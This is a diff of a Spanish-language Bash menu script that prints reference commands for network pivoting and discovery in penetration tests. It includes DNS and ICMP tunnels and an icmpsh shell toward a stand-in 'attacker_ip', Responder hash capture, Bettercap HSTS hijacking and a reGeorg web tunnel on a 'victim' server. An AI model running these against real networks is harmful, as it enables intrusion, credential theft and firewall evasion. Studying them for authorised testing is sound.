+            *) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; sleep 2 ;;
+        esac
+    done
+}
+
+# ==============================================
+# FUNCIONES DE INFORMACIÓN - PIVOTING
+# ==============================================
+
+ssh_basic_info() {
+    show_banner
+    echo -e "${GREEN}SSH Tunneling Básico:${NC}"
+    echo
+    show_command "ssh -L $LOCAL_PORT:target_host:$REMOTE_PORT user@$JUMP_HOST" "Local Port Forwarding"
+    show_command "ssh -R $REMOTE_PORT:localhost:$LOCAL_PORT user@$JUMP_HOST" "Remote Port Forwarding"
+    show_command "ssh -D $SOCKS_PORT user@$JUMP_HOST" "Dynamic Port Forwarding (SOCKS)"
+    echo -e "${MAGENTA}Objetivo:${NC} Crear túneles seguros a través de hosts intermedios."
+    echo -e "${MAGENTA}Notas:${NC} Use claves SSH en lugar de contraseñas para mayor seguridad. El forwarding local (-L) redirige puertos del cliente al servidor through el jump host."
+    press_enter
+}
+
+windows_pf_info() {
+    show_banner
+    echo -e "${GREEN}Windows Port Forwarding:${NC}"
+    echo
+    show_command "netsh interface portproxy add v4tov4 listenport=$LOCAL_PORT listenaddress=0.0.0.0 connectport=$REMOTE_PORT connectaddress=target_host" "Crear port forward"
+    show_command "netsh interface portproxy show all" "Listar port forwards activos"
+    show_command "netsh interface portproxy delete v4tov4 listenport=$LOCAL_PORT listenaddress=0.0.0.0" "Eliminar port forward"
+    show_command "netsh advfirewall firewall add rule name=\"Port Forward $LOCAL_PORT\" dir=in action=allow protocol=TCP localport=$LOCAL_PORT" "Permitir puerto en firewall"
+    echo -e "${MAGENTA}Objetivo:${NC} Redireccionar puertos en sistemas Windows."
+    echo -e "${MAGENTA}Notas:${NC} Requiere privilegios administrativos. Verificar que el firewall permite el tráfico."
+    press_enter
+}
+
+socks_proxies_info() {
+    show_banner
+    echo -e "${GREEN}SOCKS Proxies:${NC}"
+    echo
+    show_command "ssh -D $SOCKS_PORT -f -N user@$JUMP_HOST" "SOCKS Proxy con SSH (background)"
+    show_command "proxychains nmap -sT -p 80,443,3389 target_host" "Usar proxychains con SOCKS"
+    show_command "curl --socks5 127.0.0.1:$SOCKS_PORT http://internal_site" "CURL a través de SOCKS"
+    show_command "proxychains xfreerdp /v:target_host /u:user" "RDP through SOCKS"
+    echo -e "${MAGENTA}Objetivo:${NC} Enrutar tráfico de aplicaciones a través de proxies SOCKS."
+    echo -e "${MAGENTA}Notas:${NC} Configure /etc/proxychains.conf para usar el proxy SOCKS. Algunas aplicaciones necesitan soporte nativo de SOCKS."
+    press_enter
+}
+
+vpn_pivoting_info() {
+    show_banner
+    echo -e "${GREEN}VPN Pivoting:${NC}"
+    echo
+    show_command "openvpn --config client.ovpn" "OpenVPN connection"
+    show_command "ip route add 192.168.10.0/24 via 10.8.0.1" "Add route through VPN"
+    show_command "wg-quick up wg0" "WireGuard connection"
+    show_command "route add -net 192.168.20.0 netmask 255.255.255.0 gw 10.9.0.1" "Add static route"
+    echo -e "${MAGENTA}Objetivo:${NC} Conectar redes completas through VPN tunnels."
+    echo -e "${MAGENTA}Notas:${NC} Más estable que SSH tunneling para redes completas. Requiere configuración previa del servidor VPN."
+    press_enter
+}
+
+dns_tunneling_info() {
+    show_banner
+    echo -e "${GREEN}DNS Tunneling:${NC}"
+    echo
+    show_command "dnscat2-server --dns host=attacker_ip,port=53 --secret=mysecret" "Servidor dnscat2"
+    show_command "dnscat2 victim.com --secret=mysecret" "Cliente dnscat2"
+    show_command "iodined -f -c -P password 10.0.0.1 tunnel.domain.com" "Servidor iodine"
+    show_command "iodine -f -P password tunnel.domain.com" "Cliente iodine"
+    echo -e "${MAGENTA}Objetivo:${NC} Crear túneles a través de tráfico DNS para evadir firewalls."
+    echo -e "${MAGENTA}Notas:${NC} Útil cuando solo el puerto 53 (DNS) está abierto. Requiere dominio propio y configuración DNS adecuada."
+    press_enter
+}
+
+icmp_tunneling_info() {
+    show_banner
+    echo -e "${GREEN}ICMP Tunneling:${NC}"
+    echo
+    show_command "ptunnel -x password" "Servidor ptunnel"
+    show_command "ptunnel -p attacker_ip -lp 1080 -da target_ip -dp 3389 -x password" "Cliente ptunnel"
+    show_command "icmpsh -t target_ip -s attacker_ip" "icmpsh (simple)"
+    show_command "ping -c 4 -p \"68656c6c6f\" target_ip" "Ping con payload"
+    echo -e "${MAGENTA}Objetivo:${NC} Tunneling a través de paquetes ICMP (ping)."
+    echo -e "${MAGENTA}Notas:${NC} Funciona incluso en redes muy restrictivas. Bajo ancho de banda. Puede ser detectado por IDS/IPS."
+    press_enter
+}
+
+# ==============================================
+# FUNCIONES DE INFORMACIÓN - DISCOVERY
+# ==============================================
+
+nmap_advanced_info() {
+    show_banner
+    echo -e "${GREEN}Nmap Escaneo Avanzado:${NC}"
+    echo
+    show_command "nmap -sS -sV -sC -O -T4 $TARGET_NETWORK" "Escaneo completo con detección de OS"
+    show_command "nmap -p- --min-rate 10000 $TARGET_NETWORK" "Escaneo rápido de todos los puertos"
+    show_command "nmap --script vuln,smb-enum-shares $TARGET_NETWORK" "Detección de vulnerabilidades"
+    show_command "nmap -sU -p 53,67,68,69,123,137,161,162 $TARGET_NETWORK" "Escaneo UDP"
+    show_command "nmap -sS -p 80,443 --script http-enum $TARGET_NETWORK" "Enumeración HTTP"
+    echo -e "${MAGENTA}Objetivo:${NC} Descubrir hosts, servicios y vulnerabilidades."
+    echo -e "${MAGENTA}Notas:${NC} Combine diferentes técnicas para obtener información completa. Use --script-help para ver scripts disponibles."
+    press_enter
+}
+
+masscan_info() {
+    show_banner
+    echo -e "${GREEN}Masscan - Escaneo Rápido:${NC}"
+    echo
+    show_command "masscan -p1-65535 $TARGET_NETWORK --rate 10000" "Escaneo rápido de puertos"
+    show_command "masscan -p80,443,3389,22 $TARGET_NETWORK --rate 5000" "Escaneo de puertos comunes"
+    show_command "masscan -iL targets.txt -p1-65535 --rate 10000" "Escaneo desde lista de archivos"
+    show_command "masscan --ping $TARGET_NETWORK" "Solo descubrimiento de hosts"
+    echo -e "${MAGENTA}Objetivo:${NC} Escaneo ultrarrápido de grandes redes."
+    echo -e "${MAGENTA}Notas:${NC} Masscan puede escanear Internet completo en minutos. Use con precaución para no saturar redes."
+    press_enter
+}
+
+netdiscover_info() {
+    show_banner
+    echo -e "${GREEN}Netdiscover - ARP Discovery:${NC}"
+    echo
+    show_command "netdiscover -i eth0 -r $TARGET_NETWORK" "Descubrimiento ARP activo"
+    show_command "netdiscover -p -i eth0" "Modo pasivo (solo escucha)"
+    show_command "netdiscover -l hosts.txt" "Escaneo desde archivo"
+    show_command "netdiscover -f" "Modo rápido (menos verificación)"
+    echo -e "${MAGENTA}Objetivo:${NC} Descubrir hosts en red local mediante ARP."
+    echo -e "${MAGENTA}Notas:${NC} Muy efectivo en redes LAN. No funciona a través de routers. El modo pasivo es más sigiloso."
+    press_enter
+}
+
+responder_info() {
+    show_banner
+    echo -e "${GREEN}Responder - LLMNR/NBT-NS:${NC}"
+    echo
+    show_command "responder -I eth0 -wrf" "Modo activo (respuestas)"
+    show_command "responder -I eth0 -A" "Modo análisis (solo escucha)"
+    show_command "responder -I eth0 -dw" "Deshabilitar HTTP/SMB"
+    show_command "cat /usr/share/responder/logs/*.txt" "Ver logs capturados"
+    echo -e "${MAGENTA}Objetivo:${NC} Capturar hashes NTLMv2 through LLMNR/NBT-NS poisoning."
+    echo -e "${MAGENTA}Notas:${NC} Muy efectivo en redes Windows. Puede interrumpir servicios legítimos, usar con cuidado."
+    press_enter
+}
+
+bettercap_info() {
+    show_banner
+    echo -e "${GREEN}Bettercap - Análisis Completo:${NC}"
+    echo
+    show_command "bettercap -iface eth0" "Modo interactivo"
+    show_command "bettercap -iface eth0 -sniff" "Sniffing de tráfico"
+    show_command "bettercap -iface eth0 -eval 'net.probe on; net.recon on'" "Descubrimiento automático"
+    show_command "bettercap -iface eth0 -caplet hstshijack/hstshijack" "HSTS Hijacking"
+    echo -e "${MAGENTA}Objetivo:${NC} Análisis completo de red y ataques Man-in-the-Middle."
+    echo -e "${MAGENTA}Notas:${NC} Herramienta muy poderosa. Use responsablemente y solo en redes propias o con autorización."
+    press_enter
+}
+
+# ==============================================
+# FUNCIONES DE INFORMACIÓN - SSH TUNNELING
+# ==============================================
+
+ssh_local_pf_info() {
+    show_banner
+    echo -e "${GREEN}SSH Local Port Forwarding:${NC}"
+    echo
+    show_command "ssh -L 3389:internal_host:3389 user@$JUMP_HOST" "Forward RDP"
+    show_command "ssh -L 445:internal_host:445 user@$JUMP_HOST" "Forward SMB"
+    show_command "ssh -L 9000-9010:internal_host:9000-9010 user@$JUMP_HOST" "Forward rango de puertos"
+    echo -e "${MAGENTA}Objetivo:${NC} Redireccionar puertos locales a hosts internos through jump host."
+    echo -e "${MAGENTA}Notas:${NC} Los puertos se abren en localhost. Use -g para permitir conexiones externas (peligroso)."
+    press_enter
+}
+
+ssh_remote_pf_info() {
+    show_banner
+    echo -e "${GREEN}SSH Remote Port Forwarding:${NC}"
+    echo
+    show_command "ssh -R 8080:localhost:80 user@$JUMP_HOST" "Exponer web local"
+    show_command "ssh -R 2222:localhost:22 user@$JUMP_HOST" "Exponer SSH local"
+    show_command "ssh -R 0.0.0.0:3389:internal_host:3389 user@$JUMP_HOST" "Exponer en todas las interfaces"
+    echo -e "${MAGENTA}Objetivo:${NC} Exponer servicios locales al jump host."
+    echo -e "${MAGENTA}Notas:${NC} Útil para bypassear NAT/firewalls. Por defecto solo se expone en localhost del jump host."
+    press_enter
+}
+
+ssh_dynamic_pf_info() {
+    show_banner
+    echo -e "${GREEN}SSH Dynamic Port Forwarding:${NC}"
+    echo
+    show_command "ssh -D $SOCKS_PORT user@$JUMP_HOST" "SOCKS proxy básico"
+    show_command "ssh -D $SOCKS_PORT -C user@$JUMP_HOST" "SOCKS con compresión"
+    show_command "ssh -D $SOCKS_PORT -q -N user@$JUMP_HOST" "SOCKS silencioso en background"
+    echo -e "${MAGENTA}Objetivo:${NC} Crear proxy SOCKS dinámico through SSH."
+    echo -e "${MAGENTA}Notas:${NC} Todas las aplicaciones pueden usar este proxy. Configure browser o proxychains."
+    press_enter
+}
+
+ssh_multiplexing_info() {
+    show_banner
+    echo -e "${GREEN}SSH Multiplexing:${NC}"
+    echo
+    show_command "ssh -M -S /tmp/ssh_mux -f -N user@$JUMP_HOST" "Create master connection"
+    show_command "ssh -S /tmp/ssh_mux user@$JUMP_HOST" "Reuse connection"
+    show_command "ssh -O exit -S /tmp/ssh_mux user@$JUMP_HOST" "Close master connection"
+    echo -e "${MAGENTA}Objetivo:${NC} Reutilizar conexiones SSH para mayor velocidad."
+    echo -e "${MAGENTA}Notas:${NC} Reduce overhead de múltiples conexiones SSH. Muy útil para scripting."
+    press_enter
+}
+
+ssh_config_info() {
+    show_banner
+    echo -e "${GREEN}SSH Config Avanzado:${NC}"
+    echo
+    show_command "echo 'Host jump_host\n  HostName 192.168.1.100\n  User user\n  IdentityFile ~/.ssh/id_rsa\n  LocalForward 1080 localhost:1080' >> ~/.ssh/config" "SSH config file"
+    show_command "ssh -W internal_host:3389 jump_host" "ProxyJump equivalent"
+    show_command "ssh -J user1@jump1,user2@jump2 internal_host" "Multiple jumps"
+    echo -e "${MAGENTA}Objetivo:${NC} Configuración avanzada de SSH para pivoting complejo."
+    echo -e "${MAGENTA}Notas:${NC} El archivo ~/.ssh/config simplifica conexiones complejas."
+    press_enter
+}
+
+# ==============================================
+# FUNCIONES DE INFORMACIÓN - METASPLOIT
+# ==============================================
+
+metasploit_pf_info() {
+    show_banner
+    echo -e "${GREEN}Metasploit Port Forwarding:${NC}"
+    echo
+    show_command "portfwd add -l 3389 -p 3389 -r internal_host" "Forward RDP"
+    show_command "portfwd add -l 445 -p 445 -r internal_host" "Forward SMB"
+    show_command "portfwd list" "List active forwards"
+    show_command "portfwd delete -l 3389 -p 3389 -r internal_host" "Delete forward"
+    echo -e "${MAGENTA}Objetivo:${NC} Port forwarding through Meterpreter session."
+    echo -e "${MAGENTA}Notas:${NC} Works even through multiple hops. Uses existing Meterpreter session."
+    press_enter
+}
+
+metasploit_socks_info() {
+    show_banner
+    echo -e "${GREEN}Metasploit SOCKS Proxy:${NC}"
+    echo
+    show_command "use auxiliary/server/socks_proxy" "Start SOCKS server"
+    show_command "set VERSION 4a" "Set SOCKS version"
+    show_command "set SRVPORT 1080" "Set port"
+    show_command "run" "Start proxy"
+    show_command "use post/multi/manage/autoroute" "Auto add routes"
+    echo -e "${MAGENTA}Objetivo:${NC} Create SOCKS proxy through Metasploit sessions."
+    echo -e "${MAGENTA}Notas:${NC} Combine with autoroute for automatic routing through sessions."
+    press_enter
+}
+
+metasploit_full_pivot_info() {
+    show_banner
+    echo -e "${GREEN}Metasploit Pivoting Completo:${NC}"
+    echo
+    show_command "use post/multi/manage/autoroute" "Auto add routes"
+    show_command "set SESSION 1" "Set session"
+    show_command "set SUBNET 192.168.10.0/24" "Set target subnet"
+    show_command "run" "Add route"
+    show_command "use auxiliary/server/socks_proxy" "Start SOCKS"
+    echo -e "${MAGENTA}Objetivo:${NC} Pivoting completo con rutas automáticas y SOCKS."
+    echo -e "${MAGENTA}Notas:${NC} Combina autoroute y SOCKS proxy para acceso completo a la red interna."
+    press_enter
+}
+
+metasploit_reverse_info() {
+    show_banner
+    echo -e "${GREEN}Metasploit Reverse Pivoting:${NC}"
+    echo
+    show_command "portfwd add -R -l 8080 -p 80 -L 192.168.1.100" "Reverse forward"
+    show_command "use exploit/windows/local/portfwder" "Port forwarder payload"
+    echo -e "${MAGENTA}Objetivo:${NC} Reverse pivoting from internal network to attacker."
+    echo -e "${MAGENTA}Notas:${NC} Useful when internal host can't connect out. Creates reverse tunnels."
+    press_enter
+}
+
+# ==============================================
+# FUNCIONES DE INFORMACIÓN - HERRAMIENTAS AVANZADAS
+# ==============================================
+
+chisel_info() {
+    show_banner
+    echo -e "${GREEN}Chisel - TCP/UDP Tunneling:${NC}"
+    echo
+    show_command "chisel server -p 8080 --reverse" "Servidor Chisel"
+    show_command "chisel client server_ip:8080 R:1080:socks" "Cliente SOCKS"
+    show_command "chisel client server_ip:8080 R:3389:target:3389" "Reverse port forward"
+    show_command "chisel client server_ip:8080 0.0.0.0:445:target:445" "Local port forward"
+    echo -e "${MAGENTA}Objetivo:${NC} Tunneling TCP/UDP a través de firewalls."
+    echo -e "${MAGENTA}Notas:${NC} Herramienta poderosa escrita en Go. Soporta reconexión automática y cifrado."
+    press_enter
+}
+
+rpivot_info() {
+    show_banner
+    echo -e "${GREEN}Rpivot - SOCKS Proxy:${NC}"
+    echo
+    show_command "python server.py --proxy-port 1080 --server-port 9443" "Servidor Rpivot"
+    show_command "python client.py --server-ip attacker_ip --server-port 9443" "Cliente Rpivot"
+    show_command "python client.py --server-ip attacker_ip --server-port 9443 --ntlm-proxy-ip proxy_ip --ntlm-proxy-port 8080 --domain CORP --username user" "Through corporate proxy"
+    echo -e "${MAGENTA}Objetivo:${NC} Crear proxies SOCKS a través de hosts comprometidos."
+    echo -e "${MAGENTA}Notas:${NC} Soporta autenticación NTLM a través de proxies corporativos. Muy sigiloso."
+    press_enter
+}
+
+regeorg_info() {
+    show_banner
+    echo -e "${GREEN}reGeorg - Web Tunneling:${NC}"
+    echo
+    show_command "python reGeorgSocksProxy.py -p 1080 -u http://victim/tunnel.php" "Proxy SOCKS through web"
+    show_command "proxychains nmap -sT -p 3389 internal_ip" "Scan through reGeorg"
+    echo -e "${MAGENTA}Objetivo:${NC} Crear tunnels SOCKS a través de servidores web comprometidos."
+    echo -e "${MAGENTA}Notas:${NC} Ideal cuando solo el puerto 80/443 está abierto. Sube tunnel.aspx al servidor web."
+    press_enter
+}
+
+sshuttle_info() {
+    show_banner
+    echo -e "${GREEN}sshuttle - VPN-like Proxy:${NC}"
+    echo
+    show_command "sshuttle -r user@jump_host 192.168.0.0/24" "VPN completa para red"
+    show_command "sshuttle -r user@jump_host -x 192.168.1.100 192.168.0.0/24" "Excluir IP específica"
+    show_command "sshuttle -r user@jump_host --dns 192.168.0.0/24" "Incluir tunneling DNS"
+    echo -e "${MAGENTA}Objetivo:${NC} Crear VPN-like transparente sobre SSH."
+    echo -e "${MAGENTA}Notas:${NC} No requiere root en el lado del cliente. Soporta DNS tunneling."
+    press_enter
+}
+
+plink_info() {
+    show_banner
+    echo -e "${GREEN}Plink (Windows SSH):${NC}"
+    echo
+    show_command "plink.exe -ssh -P 22 -pw password user@jump_host -L 3389:internal_host:3389" "Local port forward"
+    show_command "plink.exe -ssh -P 22 -pw password user@jump_host -R 8080:localhost:80" "Remote port forward"
+    show_command "plink.exe -ssh -P 22 -pw password user@jump_host -D 1080" "Dynamic SOCKS"
+    echo -e "${MAGENTA}Objetivo:${NC} SSH tunneling en Windows sin cliente SSH nativo."
+    echo -e "${MAGENTA}Notas:${NC} Parte de PuTTY. Útil en entornos Windows restrictivos."
+    press_enter
+}
+
+proxychains_config_info() {
+    show_banner
+    echo -e "${GREEN}Proxychains Configuration:${NC}"
+    echo
+    show_command "echo 'socks5 127.0.0.1 1080' >> /etc/proxychains.conf" "Add SOCKS proxy"
+    show_command "proxychains nmap -sT -p 80,443,3389 internal_ip" "Nmap through proxy"
+    show_command "proxychains xfreerdp /v:internal_ip /u:user" "RDP through proxy"
+    show_command "proxychains evil-winrm -i internal_ip -u user" "WinRM through proxy"
+    echo -e "${MAGENTA}Objetivo:${NC} Configurar y usar proxychains para redirigir tráfico."
+    echo -e "${MAGENTA}Notas:${NC} Editar /etc/proxychains.conf para múltiples proxies en cadena. Use -f para config file personalizado."
+    press_enter
+}
+
+# ==============================================
+# INICIO DE LA APLICACIÓN
+# ==============================================
+
+echo -e "${GREEN}Iniciando Network Pivoting & Discovery Toolkit...${NC}"
+sleep 2
+main_menu
